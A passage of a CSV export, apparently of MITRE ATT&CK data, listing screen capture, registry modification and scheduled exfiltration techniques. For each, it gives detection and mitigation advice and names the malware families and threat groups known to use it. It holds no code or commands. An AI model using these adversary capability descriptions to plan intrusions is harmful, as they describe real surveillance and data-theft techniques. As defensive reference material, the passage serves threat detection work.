Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: TinyZBot,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
833,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']","['[[Software/S0161|XAgentOSX]] contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.[[CiteRef::XAgentOSX]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: XAgentOSX,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
834,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Group/G0007|APT28]] regularly deploys a custom tool to take regular screenshots of victims.[[CiteRef::ESET Sednit Part 2]][[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
835,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0148|RTM]] can capture screenshots.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RTM,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
836,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0089|BlackEnergy]] is capable of taking screenshots.[[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BlackEnergy, Black Energy",['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
837,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']","['[[Software/S0154|Cobalt Strike]]\'s ""beacon"" payload is capable of capturing screen shots.[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
838,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0094|Trojan.Karagany]] can take a desktop screenshot and save the file into <code>\\ProgramData\\Mail\\MailAg\\shot.png</code>.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Trojan.Karagany,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
839,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0086|ZLib]] has the ability to obtain screenshots of the compromised system.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: ZLib,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
840,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0050|CosmicDuke]] takes periodic screenshots and exfiltrates them.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CosmicDuke, TinyBaron, ...",['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
841,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0152|EvilGrab]] has the capability to capture screenshots.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: EvilGrab,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
842,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0153|RedLeaves]] can capture screenshots.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: RedLeaves, BUGJUICE",['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
843,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0142|StreamEx]] has the ability to modify the Registry.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: StreamEx,['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
844,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0023|CHOPSTICK]] may store RC4 encrypted configuration information in the Windows Registry.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: CHOPSTICK, SPLM, ...",['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
845,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0045|ADVSTORESHELL]] is capable of setting and deleting Registry values.[[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: ADVSTORESHELL, NETUI, ...",['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
846,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0148|RTM]] can delete all Registry entries created during its execution.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: RTM,['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
847,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0075|Reg]] may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.[[CiteRef::Microsoft Reg]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Reg, reg.exe",['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
848,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Software/S0031|BACKSPACE]] is capable of deleting Registry keys, sub-keys, and values on a victim system.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: BACKSPACE, Lecna",['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
849,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0157|SOUNDBITE]] is capable of modifying the Registry.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: SOUNDBITE,['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
850,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0158|PHOREAL]] is capable of manipulating the Registry.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: PHOREAL,['Defense Evasion'],['Technique/T1112'],['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
851,['Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.'],[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Software/S0045|ADVSTORESHELL]] collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.[[CiteRef::ESET Sednit Part 2]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Exfiltration'],['Technique/T1029'],['Scheduled Transfer'],https://attack.mitre.org/wiki/Technique/T1029
